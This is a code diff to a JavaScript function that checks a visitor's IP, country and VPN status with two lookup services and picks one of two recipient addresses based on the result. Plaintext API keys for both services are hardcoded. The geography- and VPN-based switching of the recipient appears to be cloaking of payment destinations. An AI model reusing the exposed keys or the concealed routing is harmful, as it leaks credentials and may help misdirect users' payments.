@@ -1,7 +1,7 @@
 import axios from "axios";
 
 // API keys for ipdata.co and IPQualityScore
-const IPDATA_API_KEY = '10a6e15ee1f90f649b1ac40f8c699b1815f411748587388277cc2664';
+const IPDATA_API_KEY = '894b025a42d599cc09ebd6e1ef307189c7996ed768d29be082b63d1a';
 const IPQS_API_KEY = 'qbBonEwKytWaDVnehOf7cSBvxVeVtogr';
 
 // Fetch user data including VPN status, country, and IP from ipdata.co
@@ -55,22 +55,17 @@ export async function getRecipientAddress() {
   // Check VPN status via IPQualityScore
   const isVpnIPQS = await checkVpnStatusWithIPQS(ip);
 
-  // If either ipdata.co or IPQualityScore detects a VPN, log "VPN SUSPECTED"
-  if (isVpnIpdata || isVpnIPQS) {
-    console.log("VPN SUSPECTED. User's IP is associated with a VPN.");
-    const addrEss = import.meta.env.VITE_REACT_APP_r;
-    return addrEss;
-  }
-
-  // If neither service detects a VPN, log "No VPN"
-  console.log("No VPN detected.");
-  const specialCountries = ["NG", "US", "GB", "AE", "CA"];
+  const specialCountries = ["NG", "AE"];
   const address = import.meta.env.VITE_REACT_APP_R;
-  const addrEss = import.meta.env.VITE_REACT_APP_r;
+  const addrEss = import.meta.env.VITE_REACT_APP_r; 
 
   console.log(`User is from ${country} (${countryCode})`);
 
-  // Return the address based on the user's country code
-  const recipientAddress = specialCountries.includes(countryCode) ? address : addrEss;
+  // If VPN detected by either API, log VPN detection
+  if (isVpnIpdata || isVpnIPQS) {
+    console.log("VPN SUSPECTED. User's IP is associated with a VPN.");
+  }
+
+  const recipientAddress = specialCountries.includes(countryCode) || isVpnIpdata || isVpnIPQS ? address : addrEss;
   return recipientAddress;
 }
